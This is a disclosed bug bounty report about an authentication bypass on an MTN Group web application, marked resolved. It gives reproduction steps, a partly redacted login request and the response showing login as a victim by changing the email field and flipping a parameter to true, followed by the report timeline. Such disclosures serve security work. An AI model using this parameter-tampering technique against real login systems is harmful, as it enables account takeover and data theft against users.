---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/authentication-bypass-using-an-alternate-path-or-channel
  - env/web
substate: "resolved"
weakness: "Authentication Bypass Using an Alternate Path or Channel"
enriched: true
body: true
date: 2024-09-14
submitted: 2022-09-23T14:15:28.376Z
bounty_usd: null
votes: 109
cve: []
program: "[[programs/mtn_group|MTN Group]]"
reporter: "reachaxis"
source: "https://hackerone.com/reports/1709881"
title: "Authentication Bypass Leads To  Complete Account TakeveOver on ██████████"
---
# Authentication Bypass Leads To  Complete Account TakeveOver on ██████████

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 109 | **Program:** MTN Group | **Disclosed:** 2024-09-14

- Report: [https://hackerone.com/reports/1709881](https://hackerone.com/reports/1709881)
- CWE: Authentication Bypass Using an Alternate Path or Channel
- Submitted: 2022-09-23T14:15:28.376Z

## Report summary

**The application's backend logic placed too much trust on the login information submitted by the user which allowed a remote attacker to bypass authentication and perform account takeover for all users with the wrong password. More details can 
be found here**
https://medium.com/@reachaxis/how-i-took-over-100-000-user-account-without-knowing-their-password-part-one-7d965ae9e47a

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:

Hello Team,
When an invalid email address/password is entered, the Web Application will not authenticate the user. But nevertheless, it is conceivable for an attacker to get around authentication and log in as anyone else, leading to Complete Account Takeover.

## Steps To Reproduce:
Create Two Test Account (Attacker & Victim)

Using attacker's account, login at ███████ 

1. Capture request with Burp. 
2. Without sending request to "Burp Repeater",  modify attacker's email to victim's email. For example REDACTED+██████ to  REDACTED+█████. 
3. Change the param `value:false`, to  `value:true,` and click send. 
4. Notice, attacker has successfully bypassed the authentication to login as the victim without any interaction.

## Supporting Material/References:
███

##Request
```
POST /app/login HTTP/1.1
Host: mtnmobad.mtnbusiness.com.ng
Cookie: █████
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.27 Safari/537.36
....snip....
Connection: close
{
	"params":{
		"updates":[
		{
			"param":"user",
			"value":{
				"userEmail":"REDACTED+██████",
				"userPassword":"#######"
				},
				"op":"a"
				},
				{
					"param":"gateway",
					"value":true,
					"op":"a"
					}
					],
....more....
```

##Response
```
HTTP/1.1 200 OK
Server: nginx
....snip....
{
	"error":false,
	"response":{
		"id":"/703",
	"name":"Victim ******",
	"type":"Account",
	"level":0,
	"notes":{
		},
....more....
```

██████
  
* [attachment / reference]
1. █████
2. ██████

## Impact

Supposing there are 100,000 users available, a malicious actor will enumerate all 100,000 emails for all users to achieve a mass account takeover. Additionally, an attacker can lockdown an account, delete an account, change account info, and perform large data leaks.

## Timeline

- **Report Filed**
- **Report Triaged**
- **2022-09-27** @reachaxis: Many thanks.
- **2023-01-12** @reachaxis: Hi @incognito4,
I hope you are doing well. I know your team is a busy working on other reports. But is there any updates in the meantime, since this report has been queued more than 90 days.
Including these #1707720, #1711864

Kind regards!
@v3rvain0001
- **Report Resolved**
- **2023-02-02** @reachaxis: @kendad0122 
Thanks for resolving this issue.
- **2023-02-02** @reachaxis: @kendad0122, please, kindly justify redactions for any information that is deemed sensitive on this report including #1707720, #1709881, #1711864, #1714638, #1746638 .

Best Regards!
@v3rvain0001
- **Agreed On Going Public**
- **Cancelled Disclosure Request**
- **2024-02-29** @reachaxis: Hello @vsekay,

Seeing this type of vulnerability which is rather common and quite critical, I am currently working on an article / blog post about my recent findings related to **Broken Object Level Authorization + Authentication Failures**. You can consider this an early warning for public disclosure, but I assure you that I will not be publishing anything before a full fix is confirmed from your side. 

Thanks!
@reachaxis
- **Agreed On Going Public**
- **Report Became Public**
